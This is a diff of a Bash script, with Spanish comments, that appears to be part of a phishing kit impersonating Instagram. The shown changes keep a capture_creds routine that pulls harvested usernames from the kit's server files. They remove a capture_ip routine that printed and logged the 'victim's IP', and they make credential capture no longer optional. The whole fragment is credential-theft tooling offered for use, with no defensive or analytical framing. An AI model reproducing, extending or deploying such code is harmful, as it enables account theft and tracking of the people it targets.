@@ -16,7 +16,6 @@ menu() {
         1)
             website="instagram"
             sitio_conf
-            capture_ip
             capture_creds
             ;;
         0)
@@ -29,10 +28,6 @@ menu() {
             ;;
     esac
 }
-
-# Ruta absoluta del directorio donde está el script
-BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
-
 
 # Crear directorios al momento de la ejecución
 if [[ ! -d ".server" ]]; then
@@ -49,7 +44,6 @@ if [[ -d ".server/www" ]]; then
 else
 	mkdir -p ".server/www"
 fi
-
 
 # Verificar dependencias
 dependencias() {
@@ -71,16 +65,8 @@ sitio_conf() {
     echo "Servidor corriendo en http://$HOST:$PORT"
 }
 
-# Capturar IP (opcional)
-capture_ip() {
-    if [[ -e .server/www/ip.txt ]]; then
-        IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
-        echo "IP de la víctima: $IP"
-        cat .server/www/ip.txt >> auth/ip.txt
-    fi
-}
 
-# Capturar credenciales (opcional)
+# Capturar credenciales
 capture_creds() {
     if [[ -e .server/auth/usernames.txt ]]; then
         ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
